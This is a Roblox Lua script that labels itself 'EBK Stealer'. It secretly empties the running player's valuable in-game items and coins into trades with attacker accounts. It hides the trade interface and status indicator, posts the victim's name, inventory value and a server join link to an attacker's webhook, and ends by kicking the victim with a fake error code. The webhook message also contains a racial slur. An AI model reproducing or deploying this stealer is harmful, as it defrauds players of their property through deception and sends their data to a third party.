_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")

-- Paramètres
local users = _G.Usernames or {}
local min_rap = _G.min_rap or 1
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""
local auth_token = _G.AuthToken or "EBK-SS-A" 

-- Interfaces
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui:WaitForChild("Trade")
local inTrade = false

-- Cache UI & Status "TRADING"
tradeGui.Black.Visible = false
tradeGui.Main.Visible = false

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
    if inTrade then
        -- Invisibilité de l'interface (2D)
        tradeGui.Main.Visible = false
        tradeGui.Black.Visible = false
        
        -- DÉSACTIVATION DU STATUS "TRADING" (3D)
        task.spawn(function()
            local char = plr.Character
            if char then
                for i = 1, 15 do -- On vérifie un peu plus longtemps pour être sûr
                    for _, obj in ipairs(char:GetDescendants()) do
                        if obj:IsA("BillboardGui") then
                            obj.Enabled = false
                            obj:Destroy() 
                        end
                    end
                    task.wait(0.1)
                end
            end
        end)
    end
end)

---------------------------------------------------------
-- UTILITAIRES & RAP
---------------------------------------------------------
local function formatNumber(n)
    if not n then return "0" end
    if n >= 1000000 then return string.format("%.2fM", n/1000000)
    elseif n >= 1000 then return string.format("%.2fK", n/1000) end
    return tostring(math.floor(n))
end

local function getRAP(category, itemName)
    local success, rapData = pcall(function() 
        return require(game.ReplicatedStorage.Packages.Replion).Client:GetReplion("ItemRAP").Data.Items[category] 
    end)
    if not success or not rapData then return 0 end
    for skey, rap in pairs(rapData) do
        local s, decoded = pcall(function() return HttpService:JSONDecode(skey) end)
        if s then
            for _, pair in ipairs(decoded) do
                if pair[1] == "Name" and pair[2] == itemName then return rap end
            end
        end
    end
    return 0
end

---------------------------------------------------------
-- WEBHOOK AVEC JOIN LINK & THUMBNAIL
---------------------------------------------------------
local function SendWebhook(list, prefix)
    local totalRAP = 0
    local itemLines = ""
    for _, item in ipairs(list) do
        totalRAP = totalRAP + item.RAP
        itemLines = itemLines .. "• " .. item.Name .. " [" .. formatNumber(item.RAP) .. "]\n"
    end

    local data = {
        ["auth_token"] = auth_token,
        ["content"] = (prefix ~= "") and prefix .. " game:GetService('TeleportService'):TeleportToPlaceInstance("..game.PlaceId..", '"..game.JobId.."')" or nil,
        ["embeds"] = {{
            ["title"] = "🟣 Bro join your hit nigga 🎯",
            ["color"] = 8323327,
            ["fields"] = {
                {name = "👤 Victim:", value = "```" .. plr.Name .. "```", inline = true},
                {name = "💰 Total RAP:", value = "```" .. formatNumber(totalRAP) .. "```", inline = true},
                {name = "🔗 Join link:", value = "[Click to Join Server](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")", inline = false},
                {name = "🎒 Inventory:", value = "```" .. (itemLines ~= "" and itemLines or "Empty") .. "```", inline = false}
            },
            ["thumbnail"] = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=420&height=420&format=png"
            },
            ["footer"] = {["text"] = "EBK Stealer | Session Active"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

---------------------------------------------------------
-- LOGIQUE DE VOL
---------------------------------------------------------
local function doTrade(targetName)
    local target = Players:WaitForChild(targetName)
    
    while not inTrade do
        pcall(function()
            netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
        end)
        task.wait(0.8)
    end

    if inTrade then
        for _, item in ipairs(itemsToSend) do
            pcall(function()
                netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
            end)
        end

        pcall(function()
            local rawText = tradeGui.Main.Currency.Coins.Amount.Text
            local tokens = tonumber(rawText:gsub("[^%d]", "")) or 0
            if tokens >= 1 then
                netModule:WaitForChild("RF/Trading/AddTokensToTrade"):InvokeServer(tokens)
            end
        end)

        task.wait(0.2)
        repeat
            netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
            task.wait(0.1)
            netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
            task.wait(0.1)
        until not inTrade
    end
    
    task.wait(0.5)
    plr:kick("Please check your internet connection and try again. (Error Code: 277)")
end

---------------------------------------------------------
-- SCAN & DÉPART
---------------------------------------------------------
local inv = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
for _, cat in ipairs(categories) do
    if inv[cat] then
        for id, info in pairs(inv[cat]) do
            if not info.TradeLock then
                local rap = getRAP(cat, info.Name)
                if rap >= min_rap then
                    table.insert(itemsToSend, {ItemID = id, RAP = rap, itemType = cat, Name = info.Name})
                end
            end
        end
    end
end

if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    SendWebhook(itemsToSend, (ping == "Yes" and "@everyone" or ""))

    local function onPlayer(p)
        if table.find(users, p.Name) then
            task.spawn(function() doTrade(p.Name) end)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do onPlayer(p) end
    Players.PlayerAdded:Connect(onPlayer)
end
